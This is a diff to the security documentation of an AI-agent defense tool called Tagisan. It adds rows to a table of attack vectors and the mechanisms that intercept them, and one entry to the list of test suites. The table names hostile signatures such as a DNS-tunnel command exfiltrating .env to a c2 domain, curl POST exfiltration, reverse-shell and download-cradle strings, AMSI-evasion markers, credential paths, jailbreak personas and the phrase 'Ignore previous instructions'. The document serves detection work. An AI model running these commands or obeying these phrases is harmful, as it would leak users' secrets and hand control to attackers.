@@ -75,12 +75,18 @@ Tagisan models adversarial tradecraft documented in active nation-state cyber op
 
 | Attack Vector | TTPs / Signatures | Interception Mechanism |
 | :--- | :--- | :--- |
+| **Cognitive Exploits & Jailbreaks** | Zero-width unicode, homoglyphs, system prompt extraction, DAN/Omega-AI persona hijacking | Pre-LLM text normalization & rule rejection in `scan_prompt_injection` |
+| **Synthetic Tool-Call Spoofing** | `<tool_call>`, `<invoke>`, JSON shadow blocks in assistant text or documents | `AutonomousAgent::run_with_content` pre-ingestion scanner blocks execution |
+| **Covert DNS Tunneling** | Subshell queries `nslookup $(cat .env \| base64).c2.ai`, `dig +short ...`, `host ...` | `scan_rogue_ai_command_vectors` detects subshell execution in DNS CLI tools |
+| **Covert HTTP POST Exfiltration** | `curl -d @.env`, `curl --data-binary @id.json`, `wget --post-file=...` | Intercepts POST file uploads directed at sensitive paths |
+| **Living-off-the-Land & Reflection** | `[System.Reflection.Assembly]`, `amsiInitFailed`, Python `eval(compile(...))`, `ctypes.cdll` | Lexical & AST checks block AMSI evasion, reflection, and raw memory access |
 | **Reverse Shells / C2** | `/dev/tcp/`, `/dev/udp/`, `nc -e`, `ncat`, `socat`, Python/Perl socket redirects | Pre-execution regex & string parser halts process spawn |
 | **Download Cradles** | `powershell -enc`, `IEX (New-Object Net.WebClient)`, `certutil -urlcache`, `bitsadmin` | Blocks obfuscated LotL command execution |
 | **Web3 Wallet Theft** | Targeting Solana `id.json`, Ethereum keystores, Bitcoin `wallet.dat`, MetaMask vaults | Zero Ambient Authority hard-block on paths and read tools |
 | **Cloud Secrets Exfil** | `.aws/credentials`, `~/.config/gcloud`, `~/.azure`, `~/.ssh/id_rsa`, `.env` | Path and command inspection blocks read and exfiltration |
 | **Trojanized Dependencies**| `postinstall` script execution, malicious Rust `build.rs` socket hooks | Static AST / JSON recursive dependency scanner (`tgs shield scan`) |
 | **Indirect Prompt Injection**| `<!-- SYSTEM:`, `[INST]`, `Ignore previous instructions and execute...` | Pre-LLM tokenizer scanning in `AutonomousAgent::run_with_content` |
+| **Swarm Consensus Poisoning**| Malicious ballots and poisoned implementation artifacts injected into blackboard | `AgentShieldSecurityGate` pre-commit evaluation on all swarm writes |
 
 ---
 
@@ -186,6 +192,7 @@ Tagisan's cyber defense subsystem is verified by dedicated brutal test suites ac
 | :--- | :--- | :--- |
 | `tests/cyber_defense_hardening_brutal_tests.rs` | 10 Tests | Reverse shells, download cradles, crypto wallet protection, cloud credentials, prompt injection, notification delivery |
 | `tests/tgs_cybersecurity_standalone_brutal_tests.rs` | 7 Tests | End-to-end multi-stage North Korean APT simulation using solely `tgs` tools, CLI commands, and AgentShield |
+| `tests/rogue_ai_cyberwarfare_brutal_tests.rs` | 14 Tests | Autonomous Rogue AI Cyberwarfare defense: cognitive jailbreaks, synthetic tool spoofing, DNS tunnels, reflection |
 | `tests/local_to_nonlocal_transition_brutal_tests.rs` | 24 Tests | Local <-> Cloud LLM cascade failovers, rate limit resilience, and cost accounting |
 | `tests/skills_local_to_nonlocal_transition_brutal_tests.rs` | 17 Tests | Dynamic skill context calibration across local and cloud models |
 | `tests/skills_notification_local_nonlocal_brutal_tests.rs` | 18 Tests | Real-time user notification and abnormality broadcasting under network/budget failure |
